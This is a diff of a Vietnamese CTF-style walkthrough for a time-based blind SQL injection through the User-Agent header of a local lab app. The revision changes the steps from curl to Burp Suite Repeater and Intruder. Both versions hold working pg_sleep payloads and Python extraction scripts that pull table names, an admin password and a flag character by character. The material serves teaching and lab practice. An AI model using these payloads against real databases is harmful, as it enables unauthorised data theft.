@@ -8,33 +8,58 @@
 
 **Injection Point:** HTTP Header `User-Agent`
 
-```bash
-# Normal request - fast response
-curl -A "Mozilla/5.0" http://localhost:5034/
+### Burp Suite - Repeater
 
-# Test Time-based SQLi trong User-Agent (INSERT context)
-curl -A "Mozilla'); SELECT pg_sleep(5)--" http://localhost:5034/
+1. Bật **Proxy** → **Intercept**
+2. Truy cập `http://localhost:5034/` trên browser
+3. **Right-click** → **Send to Repeater** (Ctrl+R)
+4. Trong **Repeater**, thay đổi header:
+
+```http
+GET / HTTP/1.1
+Host: localhost:5034
+User-Agent: x', '0.0.0.0'); SELECT pg_sleep(5)--
 ```
 
-→ Response chậm ~5s = **User-Agent SQLi confirmed!**
+5. Click **Send** → Kiểm tra **Response time** (góc dưới phải)
+   - Normal request: ~50-200ms
+   - Với payload: **~5000ms** ✅
+
+→ **User-Agent SQLi confirmed!**
 
 **⚠️ Context:** Ứng dụng log User-Agent vào database bằng INSERT statement:
 
 ```sql
-INSERT INTO visitors (user_agent, ip_address) VALUES ('User-Agent', '...')
+INSERT INTO visitors (user_agent, ip_address) VALUES ('User-Agent', 'IP')
 ```
 
-→ Injection point: `'); PAYLOAD--`
+→ Injection point: `x', '0.0.0.0'); PAYLOAD--`
 
 ---
 
 ## 🎯 Bước 2: IDENTIFY DATABASE
 
-```bash
-# Check database name
-curl -A "x'); SELECT CASE WHEN (current_database()='postgres') THEN pg_sleep(3) END--" http://localhost:5034/
-# ~3s delay → database = 'postgres'
+### Burp Suite - Intruder
+
+1. Trong **Repeater**, click **Action** → **Send to Intruder**
+2. **Positions tab**:
+
+```http
+User-Agent: x', '0.0.0.0'); SELECT CASE WHEN (current_database()='§postgres§') THEN pg_sleep(3) END--
 ```
+
+3. **Payloads tab**:
+
+   - Payload type: **Simple list**
+   - Add payloads: `postgres`, `botdb`, `test`, `mysql`
+
+4. **Settings tab**:
+
+   - Threads: **1** (quan trọng cho time-based!)
+
+5. **Start attack** → Kiểm tra **Response received** time
+   - `postgres`: **~3000ms** ✅
+   - Các giá trị khác: ~50ms
 
 → Database: **postgres**
 
@@ -44,21 +69,27 @@ curl -A "x'); SELECT CASE WHEN (current_database()='postgres') THEN pg_sleep(3) 
 
 ### 3.1. Đếm số bảng
 
-```bash
-curl -A "x'); SELECT CASE WHEN ((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')=3) THEN pg_sleep(5) END--" http://localhost:5034/
+**Intruder Positions:**
+
+```http
+User-Agent: x', '0.0.0.0'); SELECT CASE WHEN ((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')=§3§) THEN pg_sleep(5) END--
 ```
 
-→ ~5s delay → Có **3 bảng**
+**Payloads:** `1`, `2`, `3`, `4`, `5`
 
-### 3.2. Lấy tên bảng
+→ ~5s delay với `3` → Có **3 bảng**
 
-**Bảng 1:**
+### 3.2. Lấy tên bảng thứ 1
 
-```bash
-curl -A "x'); SELECT CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0),1,1)='§a§') THEN pg_sleep(5) END--" http://localhost:5034/
+**Positions:**
+
+```http
+User-Agent: x', '0.0.0.0'); SELECT CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0),1,1)='§a§') THEN pg_sleep(5) END--
 ```
 
-**Kết quả:**
+**Payloads:** Brute-force charset `a-z`, `_`
+
+**Kết quả các bảng:**
 
 - admin_creds
 - flags
@@ -68,13 +99,15 @@ curl -A "x'); SELECT CASE WHEN (SUBSTRING((SELECT table_name FROM information_sc
 
 ## 🗂️ Bước 4: ENUMERATE COLUMNS
 
-**Columns của bảng `flags`:**
+**Positions:**
 
-```bash
-curl -A "x'); SELECT CASE WHEN (SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flags' LIMIT 1 OFFSET 0),1,1)='§i§') THEN pg_sleep(5) END--" http://localhost:5034/
+```http
+User-Agent: x', '0.0.0.0'); SELECT CASE WHEN (SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flags' LIMIT 1 OFFSET 0),1,1)='§i§') THEN pg_sleep(5) END--
 ```
 
-**Kết quả:**
+**Payloads:** Brute-force charset `a-z`, `_`
+
+**Kết quả columns của bảng `flags`:**
 
 - id
 - name
@@ -84,9 +117,13 @@ curl -A "x'); SELECT CASE WHEN (SUBSTRING((SELECT column_name FROM information_s
 
 ## 📤 Bước 5: EXTRACT PASSWORD
 
-```bash
-curl -A "x'); SELECT CASE WHEN (SUBSTRING((SELECT password FROM admin_creds LIMIT 1 OFFSET 0),1,1)='§U§') THEN pg_sleep(5) END--" http://localhost:5034/
+**Positions:**
+
+```http
+User-Agent: x', '0.0.0.0'); SELECT CASE WHEN (SUBSTRING((SELECT password FROM admin_creds LIMIT 1 OFFSET 0),1,1)='§U§') THEN pg_sleep(5) END--
 ```
+
+**Payloads:** Brute-force charset `a-z`, `A-Z`, `0-9`, `!@#_`
 
 **Credentials:**
 
@@ -96,91 +133,102 @@ curl -A "x'); SELECT CASE WHEN (SUBSTRING((SELECT password FROM admin_creds LIMI
 
 ## 🏆 Bước 6: EXFILTRATE FLAG
 
-```bash
-curl -A "x'); SELECT CASE WHEN (SUBSTRING((SELECT value FROM flags WHERE name='sqli_034'),1,1)='§F§') THEN pg_sleep(5) END--" http://localhost:5034/
+**Positions:**
+
+```http
+User-Agent: x', '0.0.0.0'); SELECT CASE WHEN (SUBSTRING((SELECT value FROM flags WHERE name='sqli_034'),1,1)='§F§') THEN pg_sleep(5) END--
 ```
+
+**Payloads:** Brute-force charset `a-z`, `A-Z`, `0-9`, `{}_`
+
+**Burp Intruder Settings:**
+
+- Attack type: **Sniper**
+- Threads: **1** (quan trọng!)
+- Grep Match: không cần
+- Sắp xếp kết quả theo **Response received** time
+- Requests có ~5000ms là ký tự đúng
 
 🎉 **FLAG:** `FLAG{us3r_4g3nt_t1m3_bl1nd}`
 
 ---
 
-## 🤖 Exploit Script
+## 🔑 User-Agent Injection Key Points
 
-```python
-import requests
-import time
+| Aspect          | Details                                                      |
+| --------------- | ------------------------------------------------------------ |
+| Injection Point | HTTP User-Agent header                                       |
+| Detection       | Burp Repeater: `x', '0.0.0.0'); SELECT pg_sleep(5)-- `       |
+| Context         | `INSERT INTO visitors (user_agent, ip_address) VALUES (...)` |
+| Payload prefix  | `x', '0.0.0.0'); ` (close both VALUES parameters)            |
+| Payload suffix  | `-- ` (comment out rest - note the space!)                   |
 
-URL = "http://localhost:5034/"
-DELAY = 3
-THRESHOLD = 2.5
+**⚠️ SQL Context Analysis:**
 
-def check(condition):
-    start = time.time()
-    # Injection in User-Agent (INSERT context - close quote and parenthesis)
-    ua_value = f"x'); SELECT CASE WHEN ({condition}) THEN pg_sleep({DELAY}) END--"
-    try:
-        r = requests.get(URL, headers={"User-Agent": ua_value}, timeout=10)
-        elapsed = time.time() - start
-        return elapsed > THRESHOLD
-    except:
-        return False
+```sql
+-- Original query
+INSERT INTO visitors (user_agent, ip_address) VALUES ('USER_AGENT', 'IP_ADDRESS')
 
-def extract_string(query, max_len=100):
-    result = ""
-    charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_{}-@!#$%^&*()"
+-- Injected (ĐÚNG ✅)
+INSERT INTO visitors (user_agent, ip_address) VALUES ('x', '0.0.0.0'); SELECT pg_sleep(5)-- ', 'IP')
+                                                       ^^^^^^^^^^^^^ Close VALUES properly
 
-    for pos in range(1, max_len + 1):
-        found = False
-        for char in charset:
-            condition = f"SUBSTRING(({query}),{pos},1)='{char}'"
-            print(f"[*] Position {pos}: '{char}'...", end='\r')
-
-            if check(condition):
-                result += char
-                print(f"[+] Found: {result}                    ")
-                found = True
-                break
-
-        if not found:
-            break
-
-    return result
-
-# Extract flag
-print("[*] Extracting flag...")
-flag_query = "SELECT value FROM flags WHERE name='sqli_034'"
-flag = extract_string(flag_query, max_len=40)
-print(f"\n🎉 FLAG: {flag}")
+-- Injected (SAI ❌ - thiếu đóng parameter thứ 2)
+INSERT INTO visitors (user_agent, ip_address) VALUES ('x'); SELECT pg_sleep(5)-- ', 'IP')
+                                                           ^ Syntax error!
 ```
 
 ---
 
-## 🔑 User-Agent Injection Key Points
+## 🎯 Burp Suite Workflow
 
-| Aspect          | Details                                            |
-| --------------- | -------------------------------------------------- |
-| Injection Point | HTTP User-Agent header                             |
-| Detection       | Set malicious UA: `curl -A "payload"`              |
-| Context         | Usually **INSERT INTO visitors (user_agent, ...)** |
-| Payload prefix  | `'); ` (close quote + close parenthesis)           |
-| Payload suffix  | `--` (comment out rest of query)                   |
+### 1. Detection (Repeater)
 
-**⚠️ Common SQL Context:**
-
-```sql
--- Original query
-INSERT INTO visitors (user_agent, ip_address) VALUES ('Mozilla/5.0', '...')
-
--- Injected
-INSERT INTO visitors (user_agent, ip_address) VALUES ('x'); SELECT pg_sleep(5)--', '...')
+```http
+GET / HTTP/1.1
+Host: localhost:5034
+User-Agent: x', '0.0.0.0'); SELECT pg_sleep(5)--
 ```
 
-**Burp Intruder User-Agent Injection:**
+**Check:** Response time ~5000ms = SQLi confirmed
 
-1. Intercept request
-2. Right-click User-Agent header → "Send to Intruder"
-3. Mark injection point: `User-Agent: x'); SELECT CASE WHEN (condition) THEN pg_sleep(5) END§§--`
-4. Attack!
+### 2. Enumeration (Intruder)
+
+**Template:**
+
+```http
+User-Agent: x', '0.0.0.0'); SELECT CASE WHEN (CONDITION) THEN pg_sleep(5) END--
+```
+
+**Important Settings:**
+
+- Attack type: **Sniper**
+- Threads: **1** (critical for time-based!)
+- Sort by: **Response received** time
+- Payloads: Custom charset based on context
+
+### 3. Character-by-character Extraction
+
+**Example: Extract flag position 1**
+
+```http
+User-Agent: x', '0.0.0.0'); SELECT CASE WHEN (SUBSTRING((SELECT value FROM flags),1,1)='§F§') THEN pg_sleep(5) END--
+```
+
+Payloads: `A-Z`, `a-z`, `0-9`, `{}_`
+
+Response ~5000ms → Character found!
+
+---
+
+## 💡 Tips & Tricks
+
+1. **Always include space after `--`**: `-- ` not `--`
+2. **Use Repeater first** to verify payload works
+3. **Intruder Threads = 1** to avoid false positives
+4. **Increase timeout** in Burp Settings → Network → Timeouts
+5. **Monitor Response received time**, not Response completed
+6. **Test baseline** first (normal User-Agent) to know normal response time
 
 **Other injectable HTTP headers:**
 
@@ -188,21 +236,29 @@ INSERT INTO visitors (user_agent, ip_address) VALUES ('x'); SELECT pg_sleep(5)--
 - `X-Forwarded-For`
 - `Cookie`
 - `Authorization`
-- Custom headers như `X-API-Key`
-  start = time.time()
-  ua = f"Mozilla'); SELECT CASE WHEN ({cond}) THEN pg_sleep(2) END--"
-  requests.get("http://localhost:5034/", headers={"User-Agent": ua})
-  return time.time() - start > 1.5
+- Custom headers like `X-API-Key`
+
+---
+
+## 🚀 Quick Automation Script
+
+```python
+import requests
+import time
+
+def check(cond):
+    start = time.time()
+    ua = f"x', '0.0.0.0'); SELECT CASE WHEN ({cond}) THEN pg_sleep(2) END-- "
+    requests.get("http://localhost:5034/", headers={"User-Agent": ua})
+    return time.time() - start > 1.5
 
 flag = ""
 for pos in range(1, 30):
-for c in "FLAG{}\_0123456789abcdefghijklmnopqrstuvwxyz":
-if check(f"(SELECT SUBSTRING(value,{pos},1) FROM flags)='{c}'"):
-flag += c
-print(f"[+] {flag}")
-break
-
+    for c in "FLAG{}_0123456789abcdefghijklmnopqrstuvwxyz":
+        if check(f"(SELECT SUBSTRING(value,{pos},1) FROM flags WHERE name='sqli_034')='{c}'"):
+            flag += c
+            print(f"[+] {flag}")
+            break
 ```
 
 🎉 **FLAG:** `FLAG{us3r_4g3nt_t1m3_bl1nd}`
-```
